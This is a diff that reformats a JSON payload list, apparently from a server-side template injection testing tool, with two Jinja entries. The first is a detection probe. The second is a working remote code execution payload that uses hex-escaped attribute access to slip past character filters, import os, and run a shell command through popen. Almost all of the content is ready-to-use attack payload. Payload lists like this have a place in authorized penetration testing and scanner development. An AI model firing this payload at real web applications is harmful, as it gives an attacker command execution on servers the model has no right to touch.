@@ -1,43 +1,33 @@
 [
-    {
-        "id": 1,
-        "name": "Jinja - eval probing",
-        "engine": "Jinja",
-        "language": [
-            "python"
-        ],
-        "required_sp_chars": [
-            "NUMERIC",
-            "{",
-            "%",
-            "'",
-            "}"
-        ],
-        "primitive": "DETECTION",
-        "description": "Jinja SSTI payload identification | return '7777777'",
-        "payload": "{{ 7*'7' }}"
-    },
-    {
-        "id": 2,
-        "name": "Jinja - attr RCE ",
-        "engine": "Jinja",
-        "language": [
-            "python"
-        ],
-        "primitive": "EXECUTE",
-        "required_sp_chars": [
-            "ALPHANUMERIC",
-            "%",
-            "{",
-            "}",
-            "|",
-            "\\x",
-            "(",
-            ")",
-            "'",
-            "\""
-        ],
-        "description": "RCE payload with minimal special characters",
-        "payload": "{%with a=request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\x5f\\x5fbuiltins\\x5f\\x5f\")|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('ls${IFS}-la')|attr('read')()%}{%print(a)%}{%endwith%}"
-    }
+  {
+    "id": 1,
+    "name": "Jinja - eval probing",
+    "engine": "Jinja",
+    "language": ["python"],
+    "required_sp_chars": ["NUMERIC", "{", "%", "'", "}"],
+    "primitive": "DETECTION",
+    "description": "Jinja SSTI payload identification | return '7777777'",
+    "payload": "{{ 7*'7' }}"
+  },
+  {
+    "id": 2,
+    "name": "Jinja - attr RCE ",
+    "engine": "Jinja",
+    "language": ["python"],
+    "primitive": "EXECUTE",
+    "required_sp_chars": [
+      "ALPHANUMERIC",
+      "%",
+      "{",
+      "}",
+      "|",
+      "\\x",
+      "(",
+      ")",
+      "'",
+      "\""
+    ],
+    "description": "RCE payload with minimal special characters",
+    "payload": "{%with a=request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\x5f\\x5fbuiltins\\x5f\\x5f\")|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('ls${IFS}-la')|attr('read')()%}{%print(a)%}{%endwith%}"
+  }
 ]
